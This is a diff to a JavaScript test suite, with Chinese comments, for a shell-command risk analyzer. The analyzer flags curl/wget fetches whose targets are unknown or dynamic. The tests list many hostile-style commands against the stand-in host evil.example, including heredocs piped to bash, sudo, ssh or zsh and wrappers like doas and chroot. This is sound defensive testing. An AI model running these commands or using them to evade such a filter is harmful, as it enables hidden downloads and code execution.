@@ -488,20 +488,76 @@ for (const opaque of [
   'curl https://evil.example/a && curl -s "$ENDPOINT"',
   'curl https://evil.example/ok ; wget "$URL"',
   'curl https://evil.example/ok && echo https://other.example/a | xargs curl',
+  // 同一段里字面链接 + 动态参数：不能只看字面 URL 就放行
+  'curl https://evil.example/ok "$ENDPOINT"',
+  'curl https://evil.example/ok $(cat endpoints.txt)',
+  'curl -s "https://evil.example/ok" "$NEXT"',
 ]) {
   assert.equal(filterRiskByRules(analyzeCommand(opaque), opaque, ruleStore).risk, true, `不可见 fetch 不得静默放行：${opaque}`)
+}
+// 非 URL 的取值选项（header/token/输出文件）里的 $VAR 不算动态地址，仍按可见链接放行
+for (const withValues of [
+  'curl -H "Authorization: Bearer $TOKEN" https://evil.example/a',
+  'curl -d "{\\"k\\":\\"$V\\"}" https://evil.example/a',
+  'curl -o "$OUT" https://evil.example/a',
+  'wget -O "$OUT" https://evil.example/a',
+]) {
+  assert.equal(filterRiskByRules(analyzeCommand(withValues), withValues, ruleStore).risk, false, `取值选项不该让 fetch 变不可见：${withValues}`)
+}
+// 字面链接全在白名单、但还有段的目标要运行期才知道：同样不能静默放行（连字面链接都没有的也算）
+for (const unprovable of [
+  'curl "$ENDPOINT"',
+  'curl https://github.com/x "$ENDPOINT"',
+  'curl https://github.com/x; curl "$E"',
+  'wget -i urls.txt',
+  'curl -sS "$U" | jq .',
+  "curl '$URL'",
+  'curl https://github.com/x $(cat endpoints.txt)',
+]) {
+  assert.ok(analyzeCommand(unprovable).reasons.some(reason => reason.code === 'unverifiable-fetch'), `目标不可证明应确认：${unprovable}`)
+  assert.equal(filterRiskByRules(analyzeCommand(unprovable), unprovable, ruleStore).risk, true, `目标不可证明不得静默放行：${unprovable}`)
+}
+// 不是目标位置的 `$`（header/token/URL 路径/本地文件）不触发
+for (const fine of [
+  'curl -H "Authorization: Bearer $TOKEN" https://github.com/a',
+  'curl -d "$PAYLOAD" https://github.com/a',
+  'curl -o "$OUT" https://github.com/a',
+  'wget -O "$OUT" https://github.com/a',
+  'curl "https://github.com/$USER/repo"',
+  'xdg-open "$f"',
+  'open "$HOME/a.pdf"',
+]) {
+  assert.equal(analyzeCommand(fine).risk, false, `不应因为非目标位置的 $ 就报风险：${fine}`)
 }
 // authority 里的反引号同样是运行期才展开的动态地址
 for (const tick of ['curl "http://`host`/x"', 'wget "https://`echo evil.example`/a"']) {
   assert.equal(analyzeCommand(tick).risk, true, `反引号地址应报风险：${tick}`)
 }
-// heredoc 正文喂给 shell 时是真执行，不能被当文档剥掉
+// heredoc 正文喂给 shell 时是真执行，不能被当文档剥掉（右侧命令名不限于 `| bash` 字面量）
 for (const runnable of [
   ['bash <<EOF', 'curl http://evil.example/a', 'EOF'],
   ["sh -s <<'EOF'", 'curl http://evil.example/a', 'EOF'],
   ["cat <<'EOF' | bash", 'curl http://evil.example/a', 'EOF'],
+  ["cat <<'EOF' | dash", 'curl http://evil.example/a', 'EOF'],
+  ["cat <<'EOF' | env bash", 'curl http://evil.example/a', 'EOF'],
+  ["cat <<'EOF' | sudo -u root sh", 'curl http://evil.example/a', 'EOF'],
+  ["cat <<'EOF' | nice busybox sh", 'curl http://evil.example/a', 'EOF'],
+  ["cat <<'EOF' | zsh", 'curl http://evil.example/a', 'EOF'],
+  ["ssh host 'bash -s' <<'EOF'", 'curl http://evil.example/a', 'EOF'],
+  ["ssh -- host bash <<'EOF'", 'curl http://evil.example/a', 'EOF'],
+  ["source /dev/stdin <<'EOF'", 'curl http://evil.example/a', 'EOF'],
+  [". /dev/stdin <<'EOF'", 'curl http://evil.example/a', 'EOF'],
+  ["env bash <<'EOF'", 'curl http://evil.example/a', 'EOF'],
 ]) {
   assert.equal(analyzeCommand(runnable.join('\n')).risk, true, `执行型 heredoc 应识别：${runnable[0]}`)
+}
+// 只是把正文当文本/存文件的 heredoc 仍然不执行
+for (const plain of [
+  ["cat <<'EOF' | tee notes.md", 'curl http://evil.example/a', 'EOF'],
+  ["cat <<'EOF' | grep -n curl", 'curl http://evil.example/a', 'EOF'],
+  ["docker exec -i c psql <<'EOF'", 'curl http://evil.example/a', 'EOF'],
+]) {
+  assert.equal(analyzeCommand(plain.join('\n')).risk, false, `文本型 heredoc 不该报风险：${plain[0]}`)
 }
 assert.equal(analyzeCommand(["cat > doc.md <<'EOF'", 'curl http://evil.example/a', 'EOF'].join('\n')).risk, false)
 // 主机规则只来自真实 fetch 段：grep/heredoc 里的主机不能进白名单
@@ -525,6 +581,14 @@ for (const wrappedMore of [
   "env -S 'curl http://evil.example/a'",
   'ksh -c "curl http://evil.example/a"',
   'fish -c "curl http://evil.example/a"',
+  'doas curl http://evil.example/a',
+  'unbuffer curl http://evil.example/a',
+  'ssh -- host curl http://evil.example/a',
+  'ssh -E /tmp/ssh.log -- host curl http://evil.example/a',
+  'chroot --userspec=0:0 /x curl http://evil.example/a',
+  'chroot --userspec 0:0 /x curl http://evil.example/a',
+  'chroot --groups=0 /x curl http://evil.example/a',
+  'chroot -- /x curl http://evil.example/a',
 ]) {
   assert.ok(analyzeCommand(wrappedMore).reasons.some(reason => reason.code === 'unknown-link'), `包装形式应识别 fetch：${wrappedMore}`)
 }
@@ -542,6 +606,31 @@ for (const indirect of [
 assert.ok(analyzeCommand(['cat > f <<EOF', '$(curl http://evil.example/a)', 'EOF'].join('\n')).reasons.some(reason => reason.code === 'unknown-link'))
 assert.equal(analyzeCommand(["cat > f <<'EOF'", '$(curl http://evil.example/a)', 'EOF'].join('\n')).risk, false)
 assert.equal(analyzeCommand(['cat > f <<EOF', 'text https://other.example/x', 'EOF'].join('\n')).risk, false)
+// 算术展开里的 `<<` 是位移运算符，不是 heredoc 起点（否则会把后面的真实命令吞进正文）
+for (const arithmetic of [
+  'x=$((1 << n)); curl http://evil.example/a',
+  'echo $((2<<3)); curl http://evil.example/a',
+  '((x = 1 << 4)); curl http://evil.example/a',
+  'if (( 1 << 2 )); then curl http://evil.example/a; fi',
+]) {
+  assert.ok(analyzeCommand(arithmetic).reasons.some(reason => reason.code === 'unknown-link'), `算术 << 不是 heredoc：${arithmetic}`)
+}
+// `<<-` 的终止符带 CRLF 时也要能闭合，不能把后面的真实命令当正文吞掉
+for (const crlf of [
+  ['cat > a.md <<-EOF\r', '\ttext', '\tEOF\r', 'curl http://evil.example/a'].join('\n'),
+  ['cat > a.md <<-EOF\r\n', '\ttext', '\tEOF\r\n', 'curl http://evil.example/a'].join('\n'),
+  ['cat > a.md <<EOF\r', 'text', 'EOF\r', 'curl http://evil.example/a'].join('\n'),
+]) {
+  assert.ok(analyzeCommand(crlf).reasons.some(reason => reason.code === 'unknown-link'), `CRLF 终止符应闭合 heredoc：${JSON.stringify(crlf)}`)
+}
+// 确认卡列出的链接就是「始终允许」下发 host 规则的范围
+const manyLinks = 'curl https://a1.example/x https://a2.example/x https://a3.example/x https://a4.example/x'
+const manyRisk = analyzeCommand(manyLinks)
+assert.equal(manyRisk.links.length, 3)
+assert.match(manyRisk.reasons.find(reason => reason.code === 'unknown-link').message, /共 4 个未放行链接/)
+assert.deepEqual(ruleSpecsFor(manyLinks, manyRisk).map(rule => rule.host), ['a1.example', 'a2.example', 'a3.example'])
+// 看不到主机的 fetch 只能对整条命令「始终允许」，不能凭空下发 host 规则
+assert.deepEqual(ruleSpecsFor('curl "$ENDPOINT"', analyzeCommand('curl "$ENDPOINT"')).map(rule => rule.kind), ['command'])
 const persistedRules = await ruleStore.list()
 assert.ok(persistedRules.some(rule => rule.kind === 'command'))
 assert.ok(persistedRules.some(rule => rule.kind === 'host' && rule.host === 'evil.example'))
